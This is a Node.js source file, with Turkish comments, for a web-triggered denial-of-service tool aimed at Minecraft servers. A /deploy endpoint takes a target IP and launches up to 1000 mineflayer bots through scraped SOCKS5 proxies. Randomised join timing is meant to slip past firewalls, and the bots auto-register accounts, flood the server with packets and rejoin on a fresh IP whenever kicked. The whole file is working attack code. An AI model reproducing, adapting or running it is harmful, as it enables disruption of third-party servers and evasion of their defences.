const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

let proxyPool = [];

// 🔄 ULTRA PROXY SCRAPER (Firewall'u aşmak için binlerce IP)
async function getFreshProxies() {
    try {
        const res = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all');
        const data = await res.text();
        proxyPool = data.split('\n').filter(p => p.trim()).map(p => `socks5://${p.trim()}`);
        console.log(`[🌐] RYZEN 9 HAZIR: ${proxyPool.length} FARKLI IP HATTI AKTIF!`);
    } catch (e) { console.log("Proxy çekilemedi."); }
}

getFreshProxies();
setInterval(getFreshProxies, 300000);

app.post('/deploy', (req, res) => {
    const { ip, count } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[🚀] RYZEN 9 ATTACK STARTED AGAINST: ${host}`);

    for (let i = 0; i < Math.min(count, 1000); i++) {
        // Firewall Bypass: Girişleri 800ms - 1500ms arasına rastgele yayar
        // Bu sayede firewall "saldırı" olduğunu anlayamaz, "yoğunluk" sanır.
        const jitter = Math.floor(Math.random() * 1000) + (i * 800);
        
        setTimeout(() => {
            spawnBypassBot(host, port, i);
        }, jitter);
    }
    res.json({ success: true, message: "Ryzen 9 Power Engaged. Firewall Bypassing..." });
});

function spawnBypassBot(host, port, index) {
    const proxy = proxyPool[Math.floor(Math.random() * proxyPool.length)];
    if (!proxy) return;

    const bot = mineflayer.createBot({
        host: host, port: port,
        username: `Trgr_${Math.floor(Math.random() * 999999)}`,
        agent: new ProxyAgent(proxy),
        version: false, hideErrors: true, skipValidation: true
    });

    bot.on('spawn', () => {
        console.log(`[+] BYPASS: ${bot.username} İÇERİDE!`);
        bot.chat(`/register resul3163 resul3163`);
        bot.chat(`/login resul3163`);

        // 🌪️ DOS MODU: Sunucuyu Paketle Boğ
        // Ryzen 9 sayesinde her 1ms'de bir paket fırlatabiliriz!
        const packetStorm = setInterval(() => {
            if (bot.entity) {
                for(let j=0; j<50; j++) { // Tek seferde 50 paket fırlat
                    bot.look(Math.random() * 360, 0, true);
                    bot.swingArm('right', true);
                    bot.setControlState('jump', true);
                    bot.setControlState('jump', false);
                }
            }
        }, 10); // 10ms'de bir 50 paket = Saniyede 5000 paket PER BOT!
    });

    // Atılırsa saniyesinde yeni IP ile geri dal
    bot.on('end', () => {
        setTimeout(() => spawnBypassBot(host, port, index), 1000);
    });
}

app.listen(process.env.PORT || 3000);
